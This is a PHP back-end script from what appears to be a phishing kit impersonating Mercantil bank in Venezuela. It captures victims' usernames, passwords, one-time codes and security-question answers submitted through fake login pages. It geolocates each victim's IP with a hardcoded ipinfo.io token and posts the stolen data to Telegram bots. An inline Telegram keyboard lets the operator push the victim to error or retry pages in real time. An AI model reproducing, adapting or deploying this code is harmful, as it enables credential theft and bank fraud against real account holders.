<?php
// 🔧 FIX 1: Configuración de sesiones PRIMERO que todo
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// Configuración crítica de sesiones
ini_set('session.save_handler', 'files');
ini_set('session.use_strict_mode', 0);
ini_set('session.use_cookies', 0);
ini_set('session.use_only_cookies', 0);
ini_set('session.cache_limiter', '');

require_once 'config.php';

// 🔧 FIX 2: Usar ID existente si viene, si no generar uno nuevo
$id_existente = $_GET['id'] ?? $_POST['id'] ?? null;
if ($id_existente) {
    $request_id = basename($id_existente); // seguridad
} else {
    $request_id = bin2hex(random_bytes(16)); // 32 caracteres aleatorios
}

// 🔧 FIX 3: Limpieza COMPLETA antes de asignar sesión
if (session_status() === PHP_SESSION_ACTIVE) {
    session_unset();
    session_destroy();
    session_write_close();
}

// Pequeña pausa para liberar el archivo de sesión
usleep(50000); // 0.05 segundos

session_id($request_id);
session_start();

// 🔧 FIX 4: Marcar tiempo de inicio de sesión
$_SESSION['session_created'] = time();

// 🚫 Bloqueo de IPs maliciosas
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);
$ips_bloqueadas = ["---", "OTRO_IP_BLOQUEADO"];

if (in_array($user_ip, $ips_bloqueadas)) {
    http_response_code(403);
    exit;
}

// 📍 Función segura para obtener geolocalización
// 🔧 FIX 5: Timeout más corto y manejo de errores mejorado
function get_ip_info($user_ip) {
    if (!filter_var($user_ip, FILTER_VALIDATE_IP)) {
        return [];
    }
    
    $token = 'e8764d0b0d51b0'; // Tu token de ipinfo.io
    $url = "https://ipinfo.io/{$user_ip}/json?token={$token}";
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 3, // 🔧 Reducido a 3 segundos
        CURLOPT_CONNECTTIMEOUT => 2
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Solo devolver si la respuesta es válida
    if ($response && $http_code === 200) {
        $data = json_decode($response, true);
        return is_array($data) ? $data : [];
    }
    
    return [];
}

$locationData = get_ip_info($user_ip);
$cc     = $locationData['country'] ?? 'No disponible';
$city   = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

// 📂 Crear carpeta requests si no existe
// 🔧 FIX 6: Verificación de permisos mejorada
$requests_dir = __DIR__ . '/requests';
if (!file_exists($requests_dir)) {
    $created = @mkdir($requests_dir, 0755, true);
    if (!$created) {
        // Si no puede crear el directorio, continuar sin guardar archivo
        // pero registrar el error silenciosamente
        error_log("No se pudo crear directorio: $requests_dir");
    }
}

$form_origen = "desconocido";
$message = "";

// =====================
// Captura de formularios
// =====================

// index.php
if (isset($_POST['usr']) && isset($_POST['clv'])) {
    $_SESSION['usuario'] = trim($_POST['usr']);
    $pas = trim($_POST['clv']);
    $form_origen = "index.php";
    $message .= "🇻🇪『𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅 𝖠𝖼𝖼𝖾𝗌𝗈』🇻🇪\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  `" . $_SESSION['usuario'] . "`\n";
    $message .= "🔐┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$pas`\n";

// index-error.php
} elseif (isset($_POST['usr2']) && isset($_POST['clv2'])) {
    $_SESSION['usuario'] = trim($_POST['usr2']);
    $pas = trim($_POST['clv2']);
    $form_origen = "index-error.php";
    $message .= "🇻🇪『𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅 𝖠𝖼𝖼𝖾𝗌𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  `" . $_SESSION['usuario'] . "`\n";
    $message .= "🔐┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$pas`\n";

// temporal.php
} elseif (isset($_POST['cod'])) {
    $cod = trim($_POST['cod']);

    // Recuperar usuario si no está en sesión
    if (empty($_SESSION['usuario']) && !empty($_POST['id'])) {
        $old_file = $requests_dir . "/" . basename($_POST['id']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    $form_origen = "temporal.php";
    $message .= "🇻🇪『𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅』🇻🇪\n\n";
    $message .= "📲┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$cod`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// temporal-error.php
} elseif (isset($_POST['cod2'])) {
    $cod2 = trim($_POST['cod2']);

    // Recuperar usuario si no está en sesión
    if (empty($_SESSION['usuario']) && !empty($_POST['id'])) {
        $old_file = $requests_dir . "/" . basename($_POST['id']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    $form_origen = "temporal-error.php";
    $message .= "🇻🇪『𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖬𝖾𝗋𝖼𝖺𝗇𝗍𝗂𝗅-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "📲┆⬩ 𝖢𝗅𝖺𝗏𝖾.:  `$cod2`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:  " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// preguntas.php
} elseif (isset($_POST['prg']) && isset($_POST['prg2'])) {
    if (empty($_SESSION['usuario']) && isset($_POST['id_anterior'])) {
        $old_file = $requests_dir . "/" . basename($_POST['id_anterior']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }
    $q1 = trim($_POST['prg']);
    $q2 = trim($_POST['prg2']);
    $form_origen = "preguntas.php";
    $message .= "🇻🇪『𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺𝗌 𝖽𝖾 𝖲𝖾𝗀𝗎𝗋𝗂𝖽𝖺𝖽』🇻🇪\n\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 1.:  `$q1`\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 2.:  `$q2`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// preguntas-error.php
} elseif (isset($_POST['prg_error']) && isset($_POST['prg2_error'])) {
    if (empty($_SESSION['usuario']) && isset($_POST['id_anterior'])) {
        $old_file = $requests_dir . "/" . basename($_POST['id_anterior']) . ".json";
        if (file_exists($old_file)) {
            $old_data = json_decode(file_get_contents($old_file), true);
            if (!empty($old_data['usuario'])) {
                $_SESSION['usuario'] = $old_data['usuario'];
            }
        }
    }

    // Mantener el ID original para redirección en error
    $id_original = basename($_POST['id_anterior'] ?? '');

    // Validar respuestas
    $q1e = trim($_POST['prg_error']);
    $q2e = trim($_POST['prg2_error']);
    $form_origen = "preguntas-error.php";
    $message .= "🇻🇪『𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺𝗌 𝖽𝖾 𝖲𝖾𝗀𝗎𝗋𝗂𝖽𝖺𝖽-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 1.:  `$q1e`\n";
    $message .= "❓┆⬩ 𝖱𝖾𝗌𝗉𝗎𝖾𝗌𝗍𝖺 2.:  `$q2e`\n\n";
    $message .= "👤┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

    // Verifica el archivo original para evaluar las respuestas
    $file = $requests_dir . "/$id_original.json";
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        $resp1_valida = $data['question1'] ?? '';
        $resp2_valida = $data['question2'] ?? '';

        if ($q1e !== $resp1_valida || $q2e !== $resp2_valida) {
            // Redirige al error con el mismo ID
            header("Location: preguntas-error.php?id=" . urlencode($id_original));
            exit;
        }
    }
} else {
    http_response_code(400);
    exit;
}

// 📌 Añadir geolocalización
$message .= "\n🌎┆⬩ 𝖴𝖻𝗂𝖼𝖺𝖼𝗂𝗈𝗇: $cc - $region - $city\n";
$message .= "🌐┆⬩ 𝖨𝖯: $user_ip\n";

// 📁 Guardar estado en archivo
// 🔧 FIX 7: Manejo de errores al guardar archivo
$request_file = $requests_dir . "/$request_id.json";
$prev_data = [];

if (file_exists($request_file)) {
    $content = file_get_contents($request_file);
    if ($content !== false) {
        $prev_data = json_decode($content, true) ?: [];
    }
}

$request_data = array_merge($prev_data, [
    'usuario' => $_SESSION['usuario'] ?? 'Desconocido',
    'estado'  => null,
    'timestamp' => time()
]);

// Intentar guardar, pero no detener si falla
$result = @file_put_contents($request_file, json_encode($request_data, JSON_UNESCAPED_UNICODE));
if ($result === false) {
    error_log("No se pudo guardar archivo: $request_file");
}

// 🎛 Teclado en Telegram
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '〘🍀〙 𝖫𝗈𝗀𝗂𝗇', 'callback_data' => "redir:$request_id:index.php"],
            ['text' => '〘🚨〙 𝖫𝗈𝗀𝗂𝗇 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
        ],
        [
            ['text' => '〘🍀〙 𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅', 'callback_data' => "redir:$request_id:temporal.php"],
            ['text' => '〘🚨〙 𝖳𝖾𝗆𝗉𝗈𝗋𝖺𝗅 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:temporal-error.php"]
        ],
        [
            ['text' => '〘✏️〙 𝖯𝖾𝗋𝗌𝗈𝗇𝖺𝗅𝗂𝗓𝖺𝗋 𝗉𝗋𝖾𝗀𝗎𝗇𝗍𝖺𝗌', 'callback_data' => "custom:$request_id"]
        ],
        [
            ['text' => '〘🚨〙 𝖯𝗋𝖾𝗀𝗎𝗇𝗍𝖺𝗌 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:preguntas-error.php"]
        ],
        [
            ['text' => '〘🏁〙 𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
        ]
    ]
];

// 📤 Enviar a Telegram
// 🔧 FIX 8: Verificar que hay cuentas configuradas
if (empty($telegram_accounts) || !is_array($telegram_accounts)) {
    error_log("No hay cuentas de Telegram configuradas");
} else {
    foreach ($telegram_accounts as $index => $account) {
        // Verificar que la cuenta tiene datos válidos
        if (empty($account['token']) || empty($account['chat_id'])) {
            error_log("Cuenta $index incompleta, saltando...");
            continue;
        }
        
        $url = "https://api.telegram.org/bot{$account['token']}/sendMessage";
        
        $payload = [
            'chat_id' => $account['chat_id'],
            'text' => $message,
            'reply_markup' => json_encode($keyboard),
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_CONNECTTIMEOUT => 5
        ]);
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("Error cURL cuenta $index: $error");
        }
    }
}

// 🔧 FIX 9: Asegurar que la sesión se guarde antes de redirigir
session_write_close();

// 🔄 Redirigir a loader con el id actual
header("Location: load.php?id=" . urlencode($request_id));
exit;
?>
